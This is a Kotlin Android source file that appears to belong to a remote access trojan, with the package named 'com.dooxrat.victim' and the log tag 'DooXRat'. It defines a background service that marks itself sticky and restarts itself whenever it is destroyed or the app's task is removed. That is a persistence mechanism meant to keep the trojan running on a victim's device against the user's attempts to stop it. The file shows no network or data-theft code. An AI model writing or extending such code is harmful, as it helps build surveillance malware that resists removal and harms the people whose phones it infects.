package com.dooxrat.victim

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log

class BackgroundService : Service() {
    
    override fun onCreate() {
        super.onCreate()
        Log.d("DooXRat", "Background service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("DooXRat", "Background service started")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("DooXRat", "Background service destroyed - restarting")
        val restartIntent = Intent(applicationContext, BackgroundService::class.java)
        startService(restartIntent)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val restartIntent = Intent(applicationContext, BackgroundService::class.java)
        startService(restartIntent)
    }
}
